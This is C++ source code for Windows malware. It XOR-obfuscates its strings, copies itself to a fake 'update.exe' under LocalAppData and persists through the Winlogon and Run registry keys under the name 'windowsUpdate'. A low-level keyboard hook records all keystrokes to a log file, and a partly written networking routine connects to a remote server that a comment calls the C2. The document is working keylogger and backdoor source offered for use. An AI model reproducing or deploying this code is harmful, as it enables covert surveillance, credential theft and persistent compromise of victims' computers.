#include "behave.hpp"
#include "toolskit.hpp"
// #include

std::string debugLogPath = getStandardLogPath();
std::string kegLogPath = getKeyLoggerLogPath();

std::string cpSelf()
{
    // Get current path
    char cpath[MAX_PATH];
    GetModuleFileNameA(NULL, cpath, MAX_PATH);
    std::string currentPath = (std::string)cpath;

    // Get startup folder
    // LOCALAPPDATA
    char localAppData[] = "\x4c\x4e\x41\x42\x48\x44\x56\x57\x4c\x48\x5e\x4a";
    unxor(localAppData);

    // \Microsoft\Windows
    char windows[] = "\x5c\x4c\x6b\x60\x76\x6a\x75\x68\x6e\x7d\x56\x5c\x65\x63\x6a\x60\x67\x62";
    unxor(windows);

    // \update.exe
    char targetFileName[] = "\x5c\x74\x72\x67\x65\x71\x63\x29\x6d\x71\x6f";
    unxor(targetFileName);

    // Get full path
    std::string targetPath = getenv(localAppData) + (std::string)windows + (std::string)targetFileName;

    BOOL s = CopyFileA(currentPath.c_str(), targetPath.c_str(), false);
    if (s == 1)
    {
        writeLog("Replicated done ... ", debugLogPath, "Done");
        return targetPath;
    }
    writeLog("Fail to replicated ... ", debugLogPath, "Fail");
    return "";
}

bool autoStart(std::string whichToAutoStart)
{
    // ThisIsAnUncrackableKey
    // unxor
    char uncrackableKey[] = "\x54\x69\x6b\x70\x4d\x76\x47\x69\x5d\x67\x69\x79\x6d\x6e\x65\x6e\x72\x7d\x77\x58\x71\x6c";
    unxor(uncrackableKey);

    // SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    // unxor2
    char KEY_STARTUP_REGISTRY[] = "\x08\x28\x30\x28\x1f\x33\x14\x2c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x1e\x33\x17\x1c\x12\x01\x05\x0e\x20\x38\x08\x1f\x17\x23\x0b\x18\x09\x35\x3c\x07\x28";
    unxor2(KEY_STARTUP_REGISTRY, uncrackableKey);

    // Software\\Microsoft\\Windows\\CurrentVersion\\Run
    char KEY_NOT_ADMIN_STARTUP_REGISTRY[] = "\x08\x08\x10\x08\x3f\x13\x34\x0c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x1e\x33\x17\x1c\x12\x01\x05\x0e\x20\x38\x08\x1f\x17\x23\x0b\x18\x09\x35\x3c\x07\x28";
    unxor2(KEY_NOT_ADMIN_STARTUP_REGISTRY, uncrackableKey);

    // SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
    // unxor2
    char KEY_SHELL_STARTUP_REGISTRY[] = "\x08\x28\x30\x28\x1f\x33\x14\x2c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x62\x21\x02\x33\x40\x32\x15\x12\x1a\x05\x0d\x19\x34\x2f\x18\x0b\x3e\x08\x08\x30\x16\x25\x29\x01\x3a\x02\x05\x1e\x10";
    unxor2(KEY_SHELL_STARTUP_REGISTRY, uncrackableKey);

    // windowsUpdate
    // unxor
    char REG_KEY_NAME[] = "\x77\x68\x6c\x67\x6b\x72\x75\x52\x78\x6d\x6b\x7f\x69";
    unxor(REG_KEY_NAME);

    HKEY hKey;
    LONG lKey;
    bool success = false;

    lKey = RegOpenKeyExA(KEY_TARGET, KEY_SHELL_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);

    /**
     * Attempt to add to Shell Startup
     */
    if (lKey == ERROR_SUCCESS)
    {
        LONG l_set_key;
        l_set_key = RegSetValueExA(hKey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
        if (l_set_key == ERROR_SUCCESS)
        {
            success = true;
        }
        RegCloseKey(hKey);
        writeLog("Register as Shell Start-Up ... ", debugLogPath, "Done");
    }

    /**
     * Fail to add to shell startup
     * Try to add it to startup
     */
    if (!success)
    {
        lKey = RegOpenKeyExA(KEY_TARGET, KEY_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);

        // Not admin user. Add it to user startup
        if (lKey == ERROR_ACCESS_DENIED)
        {
            lKey = RegOpenKeyExA(KEY_NOT_ADMIN_TARGET, KEY_NOT_ADMIN_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);
            writeLog("About to register as User-Start-Up ... ", debugLogPath, "Done");
        }
        else
        {
            writeLog("About to register as Admin-Start-Up ... ", debugLogPath, "Done");
        }

        if (lKey == ERROR_SUCCESS)
        {
            RegSetValueExA(hKey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
            writeLog("Register as Non-Shell-Start-Up ... ", debugLogPath, "Done");
        }
    }

    return true;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        // Cast the lParam to the appropriate struct type
        KBDLLHOOKSTRUCT *pKbdHook = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

        switch (wParam)
        {
        case WM_KEYDOWN:
        {
            DWORD vkCode = pKbdHook->vkCode;
            if (GetAsyncKeyState(VK_SHIFT))
            {
                switch (vkCode)
                {
                case 0x30:
                    writeLog("[)]", kegLogPath);
                    break;
                case 0x31:
                    writeLog("[!]", kegLogPath);
                    break;
                case 0x32:
                    writeLog("[@]", kegLogPath);
                    break;
                case 0x33:
                    writeLog("[#]", kegLogPath);
                    break;
                case 0x34:
                    writeLog("[$]", kegLogPath);
                    break;
                case 0x35:
                    writeLog("[%]", kegLogPath);
                    break;
                case 0x36:
                    writeLog("[^]", kegLogPath);
                    break;
                case 0x37:
                    writeLog("[&]", kegLogPath);
                    break;
                case 0x38:
                    writeLog("[*]", kegLogPath);
                    break;
                case 0x39:
                    writeLog("[(]", kegLogPath);
                    break;
                case 0xBF:
                    writeLog("[?]", kegLogPath); ///
                    break;
                case 0xBB:
                    writeLog("[+]", kegLogPath);
                    break;
                case 0xBE:
                    writeLog("[<]", kegLogPath);
                    break;
                case 0xBD:
                    writeLog("[_]", kegLogPath);
                    break;
                case 0xE2:
                    writeLog("[>]", kegLogPath);
                    break;
                case 0x1C:
                    writeLog("[VK_CONVERT]", kegLogPath);
                    break;
                case 0x56:
                    writeLog("[@]", kegLogPath);
                    break;
                case 0x2A:
                    writeLog("[PRINT]", kegLogPath);
                    break;
                case 0x2E:
                    writeLog("[Delete]", kegLogPath);
                    break;
                case 0xAA:
                    writeLog("[Search]", kegLogPath);
                    break;
                case 0xF2:
                    writeLog("[Copy]", kegLogPath);
                    break;
                case 0xFE:
                    writeLog("[Clear]", kegLogPath);
                    break;
                case 0x3:
                    writeLog("[Connect]", kegLogPath);
                    break;
                case 0x6:
                    writeLog("[Logoff]", kegLogPath);
                    break;
                }
            }
            else
            {
                switch (vkCode)
                {
                case 0x30:
                    writeLog("0", kegLogPath);
                    break;
                case 0x31:
                    writeLog("1", kegLogPath);
                    break;
                case 0x32:
                    writeLog("2", kegLogPath);
                    break;
                case 0x33:
                    writeLog("3", kegLogPath);
                    break;
                case 0x34:
                    writeLog("4", kegLogPath);
                    break;
                case 0x35:
                    writeLog("5", kegLogPath);
                    break;
                case 0x36:
                    writeLog("6", kegLogPath);
                    break;
                case 0x37:
                    writeLog("7", kegLogPath);
                    break;
                case 0x38:
                    writeLog("8", kegLogPath);
                    break;
                case 0x39:
                    writeLog("9", kegLogPath);
                    break;
                case 0xBF:
                    writeLog("/", kegLogPath);
                    break;
                case 0xBB:
                    writeLog("=", kegLogPath);
                    break;
                case 0xBC:
                    writeLog(",", kegLogPath);
                    break;
                case 0xBE:
                    writeLog(".", kegLogPath);
                    break;
                case 0xBD:
                    writeLog("-", kegLogPath);
                    break;
                case 0xE2:
                    writeLog("<", kegLogPath);
                    break;
                }
            }
            if (!(GetAsyncKeyState(VK_SHIFT)))

            {
                switch (vkCode)
                {
                case 0x41:
                    writeLog("a", kegLogPath);
                    break;
                case 0x42:
                    writeLog("b", kegLogPath);
                    break;
                case 0x43:
                    writeLog("c", kegLogPath);
                    break;
                case 0xBA:
                    writeLog("č", kegLogPath);
                    break;
                case 0x44:
                    writeLog("d", kegLogPath);
                    break;
                case 0x45:
                    writeLog("e", kegLogPath);
                    break;
                case 0x46:
                    writeLog("f", kegLogPath);
                    break;
                case 0x47:
                    writeLog("g", kegLogPath);
                    break;
                case 0x48:
                    writeLog("h", kegLogPath);
                    break;
                case 0x49:
                    writeLog("i", kegLogPath);
                    break;
                case 0x4A:
                    writeLog("j", kegLogPath);
                    break;
                case 0x4B:
                    writeLog("k", kegLogPath);
                    break;
                case 0x4C:
                    writeLog("l", kegLogPath);
                    break;
                case 0x4D:
                    writeLog("m", kegLogPath);
                    break;
                case 0x4E:
                    writeLog("n", kegLogPath);
                    break;
                case 0x4F:
                    writeLog("o", kegLogPath);
                    break;
                case 0x50:
                    writeLog("p", kegLogPath);
                    break;
                case 0x52:
                    writeLog("r", kegLogPath);
                    break;
                case 0x53:
                    writeLog("s", kegLogPath);
                    break;
                case 0x54:
                    writeLog("t", kegLogPath);
                    break;
                case 0x55:
                    writeLog("u", kegLogPath);
                    break;
                case 0x56:
                    writeLog("v", kegLogPath);
                    break;
                case 0x5A:
                    writeLog("z", kegLogPath);
                    break;
                case 0xDC:
                    writeLog("\\", kegLogPath);
                    break;
                case 0x51:
                    writeLog("q", kegLogPath);
                    break;
                case 0x57:
                    writeLog("w", kegLogPath);
                    break;
                case 0x59:
                    writeLog("y", kegLogPath);
                    break;
                case 0x58:
                    writeLog("x", kegLogPath);
                    break;
                case 0xDE:
                    writeLog("ć", kegLogPath);
                    break;
                case 0xDD:
                    writeLog("đ", kegLogPath);
                    break;
                default:
                    writeLog(" ", kegLogPath);
                }
            }

            if ((GetAsyncKeyState(VK_SHIFT)))

            {
                switch (vkCode)
                {
                case 0x41:
                    writeLog("A", kegLogPath);
                    break;
                case 0x42:
                    writeLog("B", kegLogPath);
                    break;
                case 0x43:
                    writeLog("C", kegLogPath);
                    break;
                case 0xBA:
                    writeLog("č", kegLogPath);
                    break;
                case 0x44:
                    writeLog("D", kegLogPath);
                    break;
                case 0x45:
                    writeLog("E", kegLogPath);
                    break;
                case 0x46:
                    writeLog("F", kegLogPath);
                    break;
                case 0x47:
                    writeLog("G", kegLogPath);
                    break;
                case 0x48:
                    writeLog("H", kegLogPath);
                    break;
                case 0x49:
                    writeLog("I", kegLogPath);
                    break;
                case 0x4A:
                    writeLog("J", kegLogPath);
                    break;
                case 0x4B:
                    writeLog("K", kegLogPath);
                    break;
                case 0x4C:
                    writeLog("L", kegLogPath);
                    break;
                case 0x4D:
                    writeLog("M", kegLogPath);
                    break;
                case 0x4E:
                    writeLog("N", kegLogPath);
                    break;
                case 0x4F:
                    writeLog("O", kegLogPath);
                    break;
                case 0x50:
                    writeLog("P", kegLogPath);
                    break;
                case 0x52:
                    writeLog("R", kegLogPath);
                    break;
                case 0x53:
                    writeLog("S", kegLogPath);
                    break;
                case 0x54:
                    writeLog("T", kegLogPath);
                    break;
                case 0x55:
                    writeLog("U", kegLogPath);
                    break;
                case 0x56:
                    writeLog("V", kegLogPath);
                    break;
                case 0x5A:
                    writeLog("Z", kegLogPath);
                    break;
                case 0x51:
                    writeLog("Q", kegLogPath);
                    break;
                case 0x57:
                    writeLog("W", kegLogPath);
                    break;
                case 0x59:
                    writeLog("Y", kegLogPath);
                    break;
                case 0x58:
                    writeLog("X", kegLogPath);
                    break;
                default:
                    writeLog(" ", kegLogPath);
                }
            }

            else
                VK_SHIFT + KF_ALTDOWN;

            switch (vkCode)
            {
            case VK_SPACE:
                writeLog("[Space]", kegLogPath);
                break;
            case 0x2E:
                writeLog("[Delete]", kegLogPath);
                break;
            case VK_BACK:
                writeLog("[BackSpace]", kegLogPath);
                break;
            case VK_RETURN:
                writeLog("[Enter]\n", kegLogPath);
                break;
            case VK_LCONTROL:
                writeLog("[Ctrl]", kegLogPath);
                break;
            case VK_RCONTROL:
                writeLog("[Ctrl]", kegLogPath);
                break;
            case VK_TAB:
                writeLog("[Tab]", kegLogPath);
                break;
            case 0x25:
                writeLog("[Left Arrow]", kegLogPath);
                break;
            case 0x26:
                writeLog("[Up Arrow]", kegLogPath);
                break;
            case 0x27:
                writeLog("[Right Arrow]", kegLogPath);
                break;
            case 0x28:
                writeLog("[Down Arrow]", kegLogPath);
                break;
            case VK_ESCAPE:
                writeLog("[Esc]", kegLogPath);
                break;
            case VK_CAPITAL:
                writeLog("[Caps Lock]", kegLogPath);
                break;
            case VK_RSHIFT:
                writeLog("[Right Shift]", kegLogPath);
                break;
            case VK_LSHIFT:
                writeLog("[Left Shift]", kegLogPath);
                break;
            case VK_LMENU:
                writeLog("[Left Alt]", kegLogPath);
                break;
            case VK_RMENU:
                writeLog("[Right Alt]", kegLogPath);
                break;
            case VK_LWIN:
                writeLog("[Left Win]", kegLogPath);
                break;
            case VK_RWIN:
                writeLog("[Right Win]", kegLogPath);
                break;
            case VK_INSERT:
                writeLog("[Insert]", kegLogPath);
                break;
            case VK_SCROLL:
                writeLog("[Scroll Lock]", kegLogPath);
                break;
            case VK_HOME:
                writeLog("[Home]", kegLogPath);
                break;
            case VK_END:
                writeLog("[End]", kegLogPath);
                break;
            case VK_PRIOR:
                writeLog("[Page Up]", kegLogPath);
                break;
            case VK_NEXT:
                writeLog("[Page Down]", kegLogPath);
                break;
            case VK_SNAPSHOT:
                writeLog("[Print Screen]", kegLogPath);
                break;
            case VK_OEM_3:
                writeLog("[ ~ ` ]", kegLogPath);
                break;
            case VK_OEM_4:
                writeLog("[ { [ ]", kegLogPath);
                break;
            case VK_OEM_6:
                writeLog("[ } ] ]", kegLogPath);
                break;
            case VK_OEM_1:
                writeLog("[ : ; ]", kegLogPath);
                break;
            case VK_OEM_7:
                writeLog("[ \" ' ]", kegLogPath);
                break;
            case VK_F1:
                writeLog("[F1]", kegLogPath);
                break;
            case VK_F2:
                writeLog("[F2]", kegLogPath);
                break;
            case VK_F3:
                writeLog("[F3]", kegLogPath);
                break;
            case VK_F4:
                writeLog("[F4]", kegLogPath);
                break;
            case VK_F5:
                writeLog("[F5]", kegLogPath);
                break;
            case VK_F6:
                writeLog("[F6]", kegLogPath);
                break;
            case VK_F7:
                writeLog("[F7]", kegLogPath);
                break;
            case VK_F8:
                writeLog("[F8]", kegLogPath);
                break;
            case VK_F9:
                writeLog("[F9]", kegLogPath);
                break;
            case VK_F10:
                writeLog("[F10]", kegLogPath);
                break;
            case VK_F11:
                writeLog("[F11]", kegLogPath);
                break;
            case VK_F12:
                writeLog("[F12]", kegLogPath);
                break;
            case VK_NUMPAD0:
                writeLog("0", kegLogPath);
                break;
            case VK_NUMPAD1:
                writeLog("1", kegLogPath);
                break;
            case VK_NUMPAD2:
                writeLog("2", kegLogPath);
                break;
            case VK_NUMPAD3:
                writeLog("3", kegLogPath);
                break;
            case VK_NUMPAD4:
                writeLog("4", kegLogPath);
                break;
            case VK_NUMPAD5:
                writeLog("5", kegLogPath);
                break;
            case VK_NUMPAD6:
                writeLog("6", kegLogPath);
                break;
            case VK_NUMPAD7:
                writeLog("7", kegLogPath);
                break;
            case VK_NUMPAD8:
                writeLog("8", kegLogPath);
                break;
            case VK_NUMPAD9:
                writeLog("9", kegLogPath);
                break;
            case 0x6F:
                writeLog("[/]", kegLogPath);
                break;
            case 0x6A:
                writeLog("[*]", kegLogPath);
                break;
            case 0x6D:
                writeLog("[-]", kegLogPath);
                break;
            case 0x6B:
                writeLog("[+]", kegLogPath);
                break;
            case 0x6E:
                writeLog("[,]", kegLogPath);
                break;
            }
        }
        case WM_SYSKEYDOWN:
        {
            DWORD vkCode = pKbdHook->vkCode;
            if (GetAsyncKeyState(VK_RSHIFT))
            {
                switch (vkCode)
                {
                case 0x51:
                    writeLog("[\\]", kegLogPath);
                    break;
                case 0x57:
                    writeLog("[|]", kegLogPath);
                    break;
                case 0xDB:
                    writeLog("[{]", kegLogPath);
                    break;
                case 0xDD:
                    writeLog("[}]", kegLogPath);
                    break;
                case 0xDC:
                    writeLog("[|]", kegLogPath);
                    break;
                case 0x56:
                    writeLog("[@]", kegLogPath);
                    break;
                case 0xBE:
                    writeLog("[>]", kegLogPath);
                    break;
                }
            }
        }
        default:
            // Pass control to the next hook in the chain
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
    }

    return 0;
}

DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
    HHOOK hook;
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (hExe == NULL)
    {
        return 1;
    }
    else
    {
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hook);
    }
    return 0;
}

HANDLE startKeyLogging()
{
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0, NULL);
}

DWORD WINAPI Connector(ServerInfo sInfo)
{
    /**
     * Winsock startup
     */
    WSAData data;
    DWORD sockVer = MAKEWORD(2, 2);
    int wsResult = WSAStartup(sockVer, &data);
    if (wsResult != 0)
    {
        return 0;
    }
    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return 0;
    }

    writeLog("Server Ip: "+sInfo.ServerIp, debugLogPath, "Test");

    std::cout<<sInfo.ServerIp<<std::endl;
    std::cout<<sInfo.Port<<std::endl;

/**
 * We will use IP address in debug mode
 */
#ifdef REPORTER_DEBUG
    // Setup address
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(sInfo.Port);
    inet_pton(AF_INET, sInfo.ServerIp.c_str(), &hint.sin_addr);

    // Connect to server
    int connResult = connect(sock, (sockaddr *)&hint, sizeof(hint));
    if (connResult == SOCKET_ERROR)
    {
        writeLog("Fail to connect to server ... ", debugLogPath, "Fail");
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    writeLog("Successfully connect to server ... ", debugLogPath, "Done");
/**
 * Use domain name if C2 is ready
 */
#elif
#endif
}

HANDLE startNetworking(ServerInfo sInfo)
{
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Connector, &sInfo, 0, NULL);
}